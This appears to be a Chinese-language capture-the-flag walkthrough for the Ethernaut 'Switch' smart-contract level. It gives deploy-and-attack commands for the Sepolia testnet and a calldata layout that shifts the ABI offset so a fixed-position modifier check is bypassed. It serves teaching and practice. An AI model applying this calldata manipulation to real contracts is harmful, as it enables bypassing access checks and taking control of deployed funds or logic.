# 30-Switch
```
# 1. 部署攻击合约
forge create src/30-Switch/SwitchAttack.sol:SwitchAttack \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --broadcast

export ATTACK_ADDRESS=0xf0Ebc4e185f70fAdf5aa13392A994EDCe359b869

# 2. 执行攻击
cast send $ATTACK_ADDRESS "attack(address)" $SWITCH_ADDRESS \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY

# 3. 验证成功
cast call $SWITCH_ADDRESS "switchOn()(bool)" --rpc-url $sepolia_rpc
# 应该返回 true

# Calldata 结构解析
正常 calldata:
[0x00-0x04] flipSwitch selector
[0x04-0x24] offset = 0x20
[0x24-0x44] length = 0x04
[0x44-0x48] turnSwitchOff ← 位置 68

攻击 calldata:
[0x00-0x04] flipSwitch selector (30c13ade)
[0x04-0x24] offset = 0x60 ← 修改偏移量！
[0x24-0x44] 填充数据
[0x44-0x48] turnSwitchOff (20606e15) ← 位置 68，通过检查 ✓
[0x48-0x60] 填充数据
[0x60-0x80] length = 0x04 ← 实际 _data 在这里
[0x80-0x84] turnSwitchOn (76227e12) ← 实际执行这个！
```

### 考察点
- **ABI 编码机制**：动态类型使用偏移量指针，实际数据可在任意位置
- **Calldata 操纵**：通过修改 offset，让检查和执行看到不同的数据
- **固定位置检查缺陷**：`calldatacopy(selector, 68, 4)` 假设数据总在固定位置
- **修饰符绕过**：利用 calldata 结构特性绕过安全检查
